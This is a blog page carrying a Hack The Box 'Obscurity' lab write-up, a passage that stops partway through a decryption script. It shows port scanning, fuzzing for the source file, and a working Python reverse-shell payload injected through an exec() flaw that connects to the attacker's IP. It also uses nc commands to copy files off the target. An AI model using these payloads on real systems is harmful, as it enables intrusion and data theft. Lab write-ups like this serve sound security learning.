<!DOCTYPE html>
<html lang="en">
  <head>
    <title>
        Hackthebox - Obscurity Writeup - fmash16&#39;s blog
      </title>
        <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
    <meta name="renderer" content="webkit">
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta http-equiv="Cache-Control" content="no-siteapp" />
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    
    <meta name="theme-color" content="#000000" />
    <meta http-equiv="window-target" content="_top" />
    
    
    <meta name="description" content="Difficulty : easy, topics: python, fuzzing, john, crypto" />
    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
    <title>Hackthebox - Obscurity Writeup - fmash16&#39;s blog</title>
    
    
    <link rel="stylesheet" href="https://fmash16.github.io/css/style.min.7da690b0190e15a7d877c45a0c70585e1afa92409e2100ebbdb0fa7ed5ffc0fb.css">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
    <meta property="og:title" content="Hackthebox - Obscurity Writeup" />
<meta property="og:description" content="Difficulty : easy, topics: python, fuzzing, john, crypto" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-obscurity-writeup/" />
<meta property="og:image" content="https://fmash16.github.io/shortcode" />
<meta property="og:image" content="https://fmash16.github.io/" />
<meta property="article:published_time" content="2020-05-03T08:24:19+06:00" />
<meta property="article:modified_time" content="2020-05-03T08:24:19+06:00" />

<meta itemprop="name" content="Hackthebox - Obscurity Writeup">
<meta itemprop="description" content="Difficulty : easy, topics: python, fuzzing, john, crypto">
<meta itemprop="datePublished" content="2020-05-03T08:24:19&#43;06:00" />
<meta itemprop="dateModified" content="2020-05-03T08:24:19&#43;06:00" />
<meta itemprop="wordCount" content="772">
<meta itemprop="image" content="https://fmash16.github.io/shortcode">
<meta itemprop="image" content="https://fmash16.github.io/">



<meta itemprop="keywords" content="python,fuzzing,john," /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://fmash16.github.io/shortcode"/>

<meta name="twitter:title" content="Hackthebox - Obscurity Writeup"/>
<meta name="twitter:description" content="Difficulty : easy, topics: python, fuzzing, john, crypto"/>

    <!--[if lte IE 9]>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
      <![endif]-->

    <!--[if lt IE 9]>
        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
      <![endif]-->

   
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto&#43;Sans&#43;JP&amp;display=swap" type="text/css" media="all" /> 
   

  </head>

  
  

  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="slimContent">
      <div class="navbar-header">
        <div class="profile-block text-center">
          <a id="avatar" href="/">
            <img class="img-circle img-rotate" src="https://fmash16.github.io/avatar.png" width="200" height="200">
          </a>
          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
        </div><div class="search" id="search-form-wrap">
    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="Search" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
                        class="icon icon-search"></i></button>
            </span>
        </div>
        <div class="ins-search">
            <div class="ins-search-mask"></div>
            <div class="ins-search-container">
                <div class="ins-input-wrapper">
                    <input type="text" class="ins-search-input" placeholder="Type something..."
                        x-webkit-speech />
                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
                        aria-label="Close"><span aria-hidden="true">×</span></button>
                </div>
                <div class="ins-section-wrapper">
                    <div class="ins-section-container"></div>
                </div>
            </div>
        </div>
    </form>
</div>

        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
      </div>
      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
        <ul class="nav navbar-nav main-nav">
            <li class="menu-item menu-item-home">
                <a href="/">
                    <i class="icon icon-home-fill"></i>
                  <span class="menu-title">Home</span>
                </a>
            </li>
            <li class="menu-item menu-item-archives">
                <a href="/posts/">
                    <i class="icon icon-archives-fill"></i>
                  <span class="menu-title">Posts</span>
                </a>
            </li>
            <li class="menu-item menu-item-books">
                <a href="/categories/">
                    <i class="icon icon-book-fill"></i>
                  <span class="menu-title">Writeups</span>
                </a>
            </li>
            <li class="menu-item menu-item-tags">
                <a href="/tags/">
                    <i class="icon icon-tags"></i>
                  <span class="menu-title">Tags</span>
                </a>
            </li>
            <li class="menu-item menu-item-about">
                <a href="/about/">
                    <i class="icon icon-cup-fill"></i>
                  <span class="menu-title">About</span>
                </a>
            </li>
        </ul>
      </nav>
    </div>
  </header>

<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <div class="widget">
  <h3 class="widget-title"><u> Categories</u></h3>
    <div class="widget-body">
        <ul class="category-list">
            <li class="category-list-item"><a href="https://fmash16.github.io/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">8</span></li>
            <li class="category-list-item"><a href="https://fmash16.github.io/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">5</span></li>
        </ul>
    </div>
</div>
<div class="widget">
  <h3 class="widget-title"><u> Tags </u></h3>
    <div class="widget-body">
        <ul class="tag-list">
            
            
            <a href="https://fmash16.github.io/tags/.net/" class="tag-list-link">.net</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/.netfiddle/" class="tag-list-link">.netfiddle</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/bludit-cms/" class="tag-list-link">bludit-cms</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/c#/" class="tag-list-link">c#</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/cewl/" class="tag-list-link">cewl</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/crontab/" class="tag-list-link">crontab</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/dll/" class="tag-list-link">dll</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/dnspy/" class="tag-list-link">dnspy</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/dynamic-js/" class="tag-list-link">dynamic-js</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/dynamic-xss/" class="tag-list-link">dynamic-xss</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/environment-path-hijack/" class="tag-list-link">environment-path-hijack</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">5</span>
            
            
            <a href="https://fmash16.github.io/tags/ghidra/" class="tag-list-link">ghidra</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/gila-cms/" class="tag-list-link">gila-cms</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/injection/" class="tag-list-link">injection</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">3</span>
            
            
            <a href="https://fmash16.github.io/tags/linux-file-capabilities/" class="tag-list-link">linux-file-capabilities</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/linux-privesc/" class="tag-list-link">linux-privesc</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/logrotate-race-condition/" class="tag-list-link">logrotate-race-condition</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/mysqldump/" class="tag-list-link">mysqldump</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">4</span>
            
            
            <a href="https://fmash16.github.io/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/real-world/" class="tag-list-link">real-world</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/smb/" class="tag-list-link">smb</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/smbclient/" class="tag-list-link">smbclient</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/sql/" class="tag-list-link">sql</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/sql-truncation-attack/" class="tag-list-link">sql-truncation-attack</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/subdomain/" class="tag-list-link">subdomain</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
            
            
            <a href="https://fmash16.github.io/tags/sudo-privesc/" class="tag-list-link">sudo-privesc</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/tar/" class="tag-list-link">tar</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/vb/" class="tag-list-link">vb</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/visual-basic/" class="tag-list-link">visual-basic</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/wfuzz/" class="tag-list-link">wfuzz</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/wildcard/" class="tag-list-link">wildcard</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/windows/" class="tag-list-link">windows</a><span class="tag-list-count">1</span>
            
            
            <a href="https://fmash16.github.io/tags/xss/" class="tag-list-link">xss</a><span class="tag-list-count">1</span>
            
        </ul>

    </div>
</div>

<div class="widget">
  <h3 class="widget-title"><u> Recent Posts </u></h3>
    <div class="widget-body">
        <ul class="recent-post-list list-unstyled no-thumbnail">
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-nest-writeup/" class="title">Hackthebox - Nest Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-06-05 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-05</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-05-28 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-28</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/" class="title">TryHackMe - Wonderland Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-06-08 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-08</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/" class="title">Hackthebox - Book Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-06-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-04</time>
                    </p>
                </div>
            </li>
            <li>
                <div class="item-inner">
                    <p class="item-title">
                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" class="title">TryHackMe - CMesS Writeup</a>
                    </p>
                    <p class="item-date">
                        <time datetime="2020-06-03 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-03</time>
                    </p>
                </div>
            </li>
        </ul>
    </div>
</div>

  </div>
</aside>

    
    
<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <h4 class="toc-title">Table of Contents</h4>
    <nav id="toc" class="js-toc toc">

    </nav>
  </div>
</aside>

<main class="main" role="main"><div class="content">
  <article id="-" class="article article-type-" itemscope
    itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      <h3 itemprop="name">
  <a
    class="article-title"
    href="/writeups/hackthebox-writeups/hackthebox-obscurity-writeup/"
    >Hackthebox - Obscurity Writeup</a
  >
</h3>

      <div class="article-meta">
        
<span class="article-date">
  <i class="icon icon-calendar-check"></i>&nbsp;
<a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-obscurity-writeup/" class="article-date">
  <time datetime="2020-05-03 08:24:19 &#43;0600 &#43;06" itemprop="datePublished">2020-05-03</time>
</a>
</span>
<span class="article-category">
  <i class="icon icon-folder"></i>&nbsp;
  <a class="article-category-link" href="/categories/hackthebox-writeups/"> Hackthebox Writeups </a>
</span>  
  <span class="article-tag">
    <i class="icon icon-tags"></i>&nbsp;
    <a class="article-tag-link" href="/tags/python/"> python </a>
    <a class="article-tag-link" href="/tags/fuzzing/"> fuzzing </a>
    <a class="article-tag-link" href="/tags/john/"> john </a>
  </span>
<br>
        
        
        
      </div>
    </div>
    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
      <p><img src="/img/htb_obscurity/card.png" alt=""></p>
<h1 id="initial-foothold">Initial Foothold</h1>
<hr>
<h2 id="nmap-scan">Nmap scan:</h2>
<hr>
<pre><code># nmap -sC -sV -sS -oA nmap.out 10.10.10.168
</code></pre><p>Intersting open ports:</p>
<ul>
<li>22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
<li>80/tcp   closed http</li>
<li>8080/tcp open   http-proxy BadHTTPServer</li>
<li>9000 unknown(nc does not show any banner)</li>
</ul>
<h2 id="website-at-port-8080">Website at port 8080:</h2>
<hr>
<ul>
<li>Looks like the server runs custom software for security</li>
</ul>
<p><img src="/img/htb_obscurity/1.png" alt=""></p>
<ul>
<li>We have some contact information. We see that the box domain is
<strong>obscure.htb</strong></li>
</ul>
<p><img src="/img/htb_obscurity/2.png" alt=""></p>
<ul>
<li>Source code for the web server is in <strong>&lsquo;SuperSecureServer.py&rsquo;</strong> in the secret development directory</li>
</ul>
<p><img src="/img/htb_obscurity/3.png" alt=""></p>
<h2 id="fuzzing-the-site-to-find-the-server-source-code-using-wfuzz">Fuzzing the site to find the server source code using wfuzz:</h2>
<hr>
<pre><code>wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 401,402,403,404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
</code></pre><p>Output:</p>
<p><img src="/img/htb_obscurity/4.png" alt=""></p>
<p>We find the file under a directory called <strong>&ldquo;develop&rdquo;</strong></p>
<h2 id="analyze-the-custom-server-source-file">Analyze the custom server source file:</h2>
<hr>
<p>We get the file using wget:</p>
<pre><code>wget http://10.10.10.168:8080/develop/SuperSecureServer.py
</code></pre><p>In the source, we find an interesting function <strong>servedoc</strong>:</p>
<p><img src="/img/htb_obscurity/5.png" alt=""></p>
<p>What intersets us are the following:</p>
<pre><code>path = urllib.parse.unquote(path)
info = &quot;output = 'Document: {}'&quot;
exec(info.format(path))
</code></pre><p>We insert the following payload in the path of our request to the server to get a reverse shell:</p>
<pre><code>/';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.184&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre><p>So our web url with payload stands as:
http://10.10.10.168:8080/';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.15.184&rdquo;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&rdquo;,&quot;-i&rdquo;]);&rsquo;</p>
<p>We can write a python script that performs the request for us:</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">os</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span>host = <span style="color:#ed9d13">&#34;http://10.10.10.168:8080/&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">6</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">7</span>payload = <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">%27%</span><span style="color:#ed9d13">0Aimport</span><span style="color:#ed9d13">%20s</span><span style="color:#ed9d13">ocket%2Csubprocess%2Cos%0As%3Dsocket.socket</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">ocket.AF_INET%2Csocket.SOCK_STREAM</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0As.connect</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">28%2210.10.14.234</span><span style="color:#ed9d13">%22%</span><span style="color:#ed9d13">2C1234</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">29%0Aos.dup2</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">.fileno</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">29%2C0</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0Aos.dup2</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">.fileno</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">29%2C1</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0Aos.dup2</span><span style="color:#ed9d13">%28s</span><span style="color:#ed9d13">.fileno</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">29%2C2</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0Ap%3Dsubprocess.call</span><span style="color:#ed9d13">%28%</span><span style="color:#ed9d13">5B%22/bin/bash</span><span style="color:#ed9d13">%22%</span><span style="color:#ed9d13">2C%22-i</span><span style="color:#ed9d13">%22%</span><span style="color:#ed9d13">5D</span><span style="color:#ed9d13">%29%</span><span style="color:#ed9d13">0A%27&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">8</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">9</span>requests.get(host+payload)
</code></pre></div><p>We open a nc listener on port 1337 on our kali and enter the request to get
a reverse shell</p>
<p><img src="/img/htb_obscurity/6.png" alt=""></p>
<p>We upgrade our shell to a fully interactive one:</p>
<p><img src="/img/htb_obscurity/7.png" alt=""></p>
<h2 id="privilege-escalation---user">Privilege escalation - User:</h2>
<hr>
<p>We find a user named <strong>robert</strong> in the home directory and find the following
files:</p>
<p><img src="/img/htb_obscurity/8.png" alt=""></p>
<p>The following files interests us:</p>
<ul>
<li>check.txt</li>
<li>out.txt</li>
<li>passwordreminder.txt</li>
<li>SuperSecureCrypt.py</li>
<li>BetterSSH</li>
</ul>
<p>We transfer the files to our local machine using nc:
On target: nc 10.10.15.184 8888 &lt; SuperSecureCrypt.py
On host: nc -lnvp 8888 &gt; SuperSecureCrypt.py</p>
<p>So, we have a custom Crypt here.
The contents of the files are:</p>
<p><img src="/img/htb_obscurity/9.png" alt=""></p>
<p>So, we have to find out the key of the user robert by briyteforcing and then
use the key to decrypt the passwordreminder.txt using the script
SuperSecureCrypt.py</p>
<p>We write a decryptor in python</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#999;font-style:italic">#! /usr/bin/env python3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#999;font-style:italic"># -*- coding: utf-8 -*-</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">__future__</span> <span style="color:#6ab825;font-weight:bold">import</span> print_function
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">decrypt</span>(text, key):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>    keylen = <span style="color:#24909d">len</span>(key)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>    keyPos = <span style="color:#3677a9">0</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>    decrypted = <span style="color:#ed9d13">&#34;&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>    <span style="color:#6ab825;font-weight:bold">for</span> x <span style="color:#6ab825;font-weight:bold">in</span> text:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>        keyChr = key[keyPos]
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>        newChr = <span style="color:#24909d">ord</span>(x)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>        newChr = <span style="color:#24909d">chr</span>((newChr - <span style="color:#24909d">ord</span>(keyChr)) % <span style="color:#3677a9">255</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span>        decrypted += newChr
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span>        keyPos += <span style="color:#3677a9">1</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>        keyPos = keyPos % keylen
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span>    <span style="color:#6ab825;font-weight:bold">return</span> decrypted
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span>key = <span style="color:#ed9d13">&#39;&#39;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>pos = <span style="color:#3677a9">0</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span><span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;out.txt&#34;</span>, <span style="color:#ed9d13">&#39;r&#39;</span>, encoding=<span style="color:#ed9d13">&#39;UTF-8&#39;</span>) <span style="color:#6ab825;font-weight:bold">as</span> f:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span>    data = f.read()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>    <span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;check.txt&#34;</span>, <span style="color:#ed9d13">&#39;r&#39;</span>, encoding=<span style="color:#ed9d13">&#39;UTF-8&#39;</span>) <span style="color:#6ab825;font-weight:bold">as</span> d:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>        ch = d.read()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>        <span style="color:#6ab825;font-weight:bold">for</span> x <span style="color:#6ab825;font-weight:bold">in</span> data:
